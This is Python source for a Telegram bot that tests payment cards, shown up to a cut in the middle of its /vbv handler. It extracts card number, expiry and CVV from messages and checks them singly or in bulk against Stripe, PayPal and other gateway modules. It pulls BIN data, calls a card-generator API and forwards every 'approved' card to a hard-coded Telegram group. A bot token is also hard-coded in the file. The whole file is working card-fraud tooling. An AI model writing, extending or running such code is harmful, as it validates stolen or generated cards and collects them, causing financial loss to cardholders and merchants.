#=============================IMPORTS==============================#
import telebot
import requests
import json
import time
import random
import string
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import threading
import concurrent.futures
import re
from datetime import datetime, timedelta
import os
import iso3166
from urllib.parse import urlparse
import psutil
import platform
from datetime import datetime
import io
from bs4 import BeautifulSoup
from googlesearch import search
import stripe

#====================================================================#

#====================Gateway Files===================================#
from chk import check_card
from au import process_card_au
from at import process_card_at
from vbv import check_vbv_card
from py import check_paypal_card
from qq import check_qq_card
from cc import process_cc_card
from pp import process_card_pp
from svb import process_card_svb
from ar import process_ar_card
from sr import process_card_sr
from pf import process_pf_card
from sq import process_sq_card
#====================================================================#

#==============================API===================================#
CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"
#====================================================================#

#==========================BOT=======================================#
# Bot token
BOT_TOKEN = "8398297374:AAE-bhGRfTu5CHsF6dgrR3rzglWQ2N4KmaI"
bot = telebot.TeleBot(BOT_TOKEN)
#=====================================================================#

#===========================DATA AND INFO=============================#
# Configuration
OWNER_ID = 8026335083  # Replace with your Telegram ID
ADMIN_IDS = [8026335083, 112233445]  # Replace with admin Telegram IDs
USER_DATA_FILE = "users.json"
GROUP_DATA_FILE = "groups.json"
APPROVED_CARDS_GROUP_ID = -1002990374080
CREDIT_RESET_INTERVAL = 3600  # 1 hour in seconds
CREDITS_PER_HOUR = 100  # Credits per hour
MAX_MASS_CHECK = 10  # Max cards per mass check
#=====================================================================#

# Load user data from file
def load_users():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

# Save user data to file
def save_users(users):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Load group data from file
def load_groups():
    try:
        with open(GROUP_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# Save group data to file
def save_groups(groups):
    with open(GROUP_DATA_FILE, 'w') as f:
        json.dump(groups, f, indent=4)

# Initialize user data
def init_user(user_id, username=None):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "credits": CREDITS_PER_HOUR,
            "last_reset": int(time.time()),
            "username": username,
            "total_checks": 0,
            "approved": 0,
            "declined": 0
        }
        save_users(users)

# Save user function (missing from original code)
def save_user(user_id, username=None):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "credits": CREDITS_PER_HOUR,
            "last_reset": int(time.time()),
            "username": username,
            "total_checks": 0,
            "approved": 0,
            "declined": 0
        }
        save_users(users)

# Reset credits for all users
def reset_credits():
    while True:
        users = load_users()
        for user_id in users:
            if int(time.time()) - users[user_id]["last_reset"] >= CREDIT_RESET_INTERVAL:
                users[user_id]["credits"] = CREDITS_PER_HOUR
                users[user_id]["last_reset"] = int(time.time())
        save_users(users)
        time.sleep(CREDIT_RESET_INTERVAL)

# Start credit reset thread
threading.Thread(target=reset_credits, daemon=True).start()

# Get user status
def get_user_status(user_id):
    if user_id == OWNER_ID:
        return "Owner"
    elif user_id in ADMIN_IDS:
        return "Admin"
    else:
        return "User"

# Get user credits
def get_user_credits(user_id):
    users = load_users()
    return users.get(str(user_id), {}).get("credits", 0)

# Deduct user credits
def deduct_credits(user_id, amount):
    users = load_users()
    if str(user_id) in users and users[str(user_id)]["credits"] >= amount:
        users[str(user_id)]["credits"] -= amount
        save_users(users)
        return True
    return False

# Load group data from file (improved)
def load_groups():
    try:
        with open(GROUP_DATA_FILE, 'r') as f:
            data = json.load(f)
            # Ensure we return a list of integers
            if isinstance(data, list):
                return [int(x) for x in data if str(x).lstrip('-').isdigit()]
            return []
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# Add this near the top with other constants
USER_SITES_FILE = "user_sites.json"

# Add this with other initialization code
USER_SITES = {}
if os.path.exists(USER_SITES_FILE):
    with open(USER_SITES_FILE, 'r') as f:
        USER_SITES = json.load(f)

def save_user_sites():
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(USER_SITES, f)

# Status texts and emojis (add with other status constants)
status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '❎',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Get BIN info
def get_bin_info(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': data.get('bin', ''),
                'brand': data.get('brand', 'None'),
                'country': data.get('country_name', 'None'),
                'country_flag': data.get('country_flag', ''),
                'bank': data.get('bank', 'None'),
                'type': data.get('type', 'None'),
                'level': data.get('level', 'None')
            }
        return None
    except:
        return None

def send_to_group(cc, gateway, response, bin_info, time_taken, user_info):
    user_status = get_user_status(user_info.id)
    mention = f"<a href='tg://user?id={user_info.id}'>{user_info.first_name}</a>"
    
    response_text = approved_check_format(
        cc=cc,
        gateway=gateway,
        response=response,
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken
    )
    
    try:
        # First, check if the group ID is valid
        if APPROVED_CARDS_GROUP_ID == -1001234567890:  # Default placeholder ID
            print("Warning: APPROVED_CARDS_GROUP_ID is still the default placeholder")
            return False
            
        # Try to send the message
        sent_message = bot.send_message(
            chat_id=APPROVED_CARDS_GROUP_ID,
            text=response_text,
            parse_mode='HTML'
        )
        print(f"Successfully sent approved card to group: {APPROVED_CARDS_GROUP_ID}")
        return True
        
    except Exception as e:
        error_msg = f"Failed to send to group {APPROVED_CARDS_GROUP_ID}: {str(e)}"
        print(error_msg)
        
        # Try to send error notification to owner
        try:
            if user_info.id != OWNER_ID:  # Don't send error to owner if they're the one checking
                bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"❌ Group send failed:\n{error_msg}\n\nCard: {cc}",
                    parse_mode='HTML'
                )
        except:
            pass
            
        return False
# Format for checking status
def checking_status_format(cc, gateway, bin_info):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Processing</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>"""
    return result

# Format the check result for approved status
def approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Format the check result for declined status
def declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Single check format function
def single_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken, status):
    if status.upper() == "APPROVED":
        return approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)
    else:
        return declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)

# Check if user has enough credits
def check_credits(user_id, amount=1):
    users = load_users()
    if str(user_id) not in users or users[str(user_id)]["credits"] < amount:
        return False
    return True

# Deduct credits for a check
def use_credits(user_id, amount=1):
    if check_credits(user_id, amount):
        deduct_credits(user_id, amount)
        return True
    return False

# Format for mass check
STATUS_EMOJIS = {
    'APPROVED': '✅',
    'Approved': '✅',
    'DECLINED': '❌',
    'Declined': '❌',
    'CCN': '🟡',
    'ERROR': '⚠️',
    'Error': '⚠️'
}

def format_mass_check(results, total_cards, processing_time, gateway, checked=0):
    approved = sum(1 for r in results if r['status'].upper() in ['APPROVED', 'APPROVED'])
    ccn = sum(1 for r in results if r['status'].upper() == 'CCN')
    declined = sum(1 for r in results if r['status'].upper() in ['DECLINED', 'DECLINED'])
    errors = sum(1 for r in results if r['status'].upper() in ['ERROR', 'ERROR'])

    response = f"""<a href='https://t.me/stormxvup'>↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>{approved}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐂𝐍 ⌁ <i>{ccn}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>{declined}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>{processing_time:.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
"""

    for result in results:
        status_key = result['status'].upper()
        emoji = STATUS_EMOJIS.get(status_key, '❓')
        if status_key not in STATUS_EMOJIS:
            if 'APPROVED' in status_key:
                emoji = '✅'
            elif 'DECLINED' in status_key:
                emoji = '❌'
            elif 'ERROR' in status_key:
                emoji = '⚠️'
            else:
                emoji = '❓'
        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐎𝐭𝐮𝐬 ⌁ {emoji} <i>{result['response']}</i>\n<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>\n"
    return response

def format_mass_check_processing(total_cards, checked, gateway):
    return f"""<a href='https://t.me/stormxvup'>↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>0</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐂𝐌 ⌁ <i>0</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>0</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>0.00 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>Processing cards...</a>"""


#=======================================================GATES========================================================================#
# Handle /chk command
@bot.message_handler(commands=['chk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.chk'))
def handle_chk(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        """
        Extracts a credit card from messy/jumbled text in various formats
        and normalizes to CC|MM|YY|CVV.
        Supported formats:
        CC|MM|YY|CVV
        CC:MM:YYYY:CVV
        CC/MM/YYYY/CVV
        CC.MM.YYYY.CVV
        CC\MM\YYYY\CVV
        CC|MM/YYYY|CVV
        CCMMYYYYCVV
        """
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system (already in your project) ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        # If user replied, check text or caption
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC from input ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Stripe Auth", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run check ---
    start_time = time.time()
    check_result = check_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"] == "Approved":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /au command
@bot.message_handler(commands=['au'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.au'))
def handle_au(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        """
        Extracts a credit card from messy/jumbled text in various formats
        and normalizes to CC|MM|YY|CVV.
        Supported formats:
        CC|MM|YY|CVV
        CC:MM:YYYY:CVV
        CC/MM/YYYY/CVV
        CC.MM.YYYY.CVV
        CC\MM\YYYY\CVV
        CC|MM/YYYY|CVV
        CCMMYYYYCVV
        """
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system (already in your project) ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Stripe Auth 2", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run AU check ---
    start_time = time.time()
    check_result = process_card_au(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# Handle /mass command
import re
import time
import threading
import concurrent.futures

@bot.message_handler(commands=['mass'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mass'))
def handle_mass(message):
    # --- Helper: extract CCs from messy text ---
    def extract_ccs(text: str):
        """
        Extracts all possible CCs from messy/jumbled text in various formats
        and normalizes them to CC|MM|YY|CVV.
        Supported:
        CC|MM|YY|CVV
        CC:MM:YYYY:CVV
        CC/MM/YYYY/CVV
        CC.MM.YYYY.CVV
        CC\MM\YYYY\CVV
        CC|MM/YYYY|CVV
        CCMMYYYYCVV
        """
        if not text:
            return []

        # Normalize separators to "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        matches = re.findall(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        cards = []
        for cc, mm, yy, cvv in matches:
            if len(yy) == 4:  # Convert YYYY → YY
                yy = yy[-2:]
            mm = mm.zfill(2)
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
        return cards

    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split(maxsplit=1)

        if len(command_parts) > 1:
            cards_text = command_parts[1]
        elif message.reply_to_message:
            if message.reply_to_message.text:
                cards_text = message.reply_to_message.text
            elif message.reply_to_message.caption:
                cards_text = message.reply_to_message.caption

        if not cards_text:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # --- Extract CCs ---
        cards = extract_ccs(cards_text)

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in supported formats.")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        # --- Deduct credits ---
        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"<pre>↯ Starting Mass Stripe Auth 2 Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        try:
            first_card_result = process_card_au(cards[0])
            gateway = first_card_result.get("gateway", "Stripe Auth 2")
        except:
            gateway = "Stripe Auth 2"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_au, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', gateway)
                            })

                            # Send approved to group
                            if result['status'].upper() == "APPROVED":
                                bin_number = card.split('|')[0][:6]
                                bin_info = get_bin_info(bin_number) or {}
                                send_to_group(
                                    cc=card,
                                    gateway=result['gateway'],
                                    response=result['response'],
                                    bin_info=bin_info,
                                    time_taken=time.time() - start_time,
                                    user_info=message.from_user
                                )

                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AU check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mchk command
@bot.message_handler(commands=['mchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mchk'))
def handle_mchk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        # --- Extract cards text ---
        cards_text = None
        command_parts = message.text.split(maxsplit=1)

        if len(command_parts) > 1:
            cards_text = command_parts[1]
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text

        if not cards_text:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # --- Collect cards ---
        cards = [c.strip() for c in cards_text.replace("\r", "").split("\n") if "|" in c]
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        # --- Limit max cards ---
        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} only.")

        # --- Credit check ---
        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        # --- Initial message ---
        initial_msg = f"<pre>↯ Starting Mass Stripe Auth Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        # --- Gateway detection (first card only) ---
        try:
            gateway = check_card(cards[0]).get("gateway", "Stripe Auth ")
        except:
            gateway = "Stripe Auth 2th"

        # --- Process cards in thread ---
        def process_cards():
            start_time = time.time()
            results = []

            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(check_card, card): card for card in cards}

                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            status = result.get("status", "ERROR")
                            response = result.get("response", "No response")
                            gw = result.get("gateway", gateway)

                            results.append({
                                'card': card,
                                'status': status,
                                'response': response,
                                'gateway': gw
                            })

                            # ✅ Send approved card to group
                            if status.upper() == "APPROVED":
                                bin_number = card.split('|')[0][:6]
                                bin_info = get_bin_info(bin_number) or {}
                                send_to_group(
                                    cc=card,
                                    gateway=gw,
                                    response=response,
                                    bin_info=bin_info,
                                    time_taken=round(time.time() - start_time, 2),
                                    user_info=message.from_user
                                )

                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        # --- Update progress every 2 cards ---
                        if i % 2 == 0 or i == len(cards):
                            current_time = time.time() - start_time
                            progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                            bot.edit_message_text(
                                chat_id=message.chat.id,
                                message_id=status_message.message_id,
                                text=progress_msg,
                                parse_mode='HTML'
                            )

                # --- Final result ---
                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=f"❌ Mass check failed: {str(e)}",
                    parse_mode='HTML'
                )

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /vbv command
# --------------------
# SINGLE CHECK HANDLERS
# --------------------

@bot.message_handler(commands=['vbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.vbv'))
def handle_vbv(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
